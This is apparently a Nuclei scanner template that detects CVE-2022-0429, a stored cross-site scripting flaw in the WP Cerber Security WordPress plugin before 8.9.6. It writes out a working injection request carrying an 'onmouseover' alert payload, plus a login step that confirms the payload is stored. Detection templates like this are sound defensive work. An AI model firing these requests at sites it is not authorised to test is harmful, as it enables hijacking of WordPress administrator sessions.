flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - contains(body, "RID")
    - status_code == 403
    internal: true
    type: dsl
  raw:
  - 'POST /"/onmouseover=alert(document.domain);// HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 100


    a[b][c][d][e][f][g][h][i][j][k][l][m][n][o][p][q][r][s][t][u][v][w][x][y][z][1][2][3][4][5][6]=12345

    '
  unsafe: true
- matchers:
  - part: body_2
    type: word
    words:
    - <wbr>/"<wbr>/onmouseover=alert(document.domain);<wbr>/<wbr>/</p>
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
  - 'GET /wp-admin/admin.php?page=cerber-security&tab=activity HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2022-0429
info:
  author: s4e-io
  classification:
    cpe: cpe:2.3:a:cerber:wp_cerber_security\,_anti-spam_\&_malware_scan:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-0429
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.7491
    epss-score: 0.00888
  description: 'The WP Cerber Security, Anti-spam & Malware Scan WordPress plugin
    before 8.9.6 does not sanitise the $url variable before using it in an attribute
    in the Activity tab in the plugins dashboard, leading to an unauthenticated stored
    Cross-Site Scripting vulnerability.

    '
  impact: 'Unauthenticated attackers can inject stored XSS payloads via unsanitized
    URL parameters, which execute when authenticated administrators view the Activity
    tab, potentially stealing session cookies or performing administrative actions.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: wp_cerber_security\,_anti-spam_\&_malware_scan
    vendor: cerber
    verified: true
  name: WP Cerber Security, Anti-spam & Malware Scan < 8.9.6 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/d1b6f438-f737-4b18-89cf-161238a7421b/
  - https://www.wiz.io/vulnerability-database/cve/cve-2022-0429
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0429
  remediation: 'Upgrade to WP Cerber Security version 8.9.6 or later.

    '
  severity: medium
  tags: cve,cve2022,wp,wp-plugin,wpscan,wordpress,xss,wp-cerber,authenticated,vkev,vuln
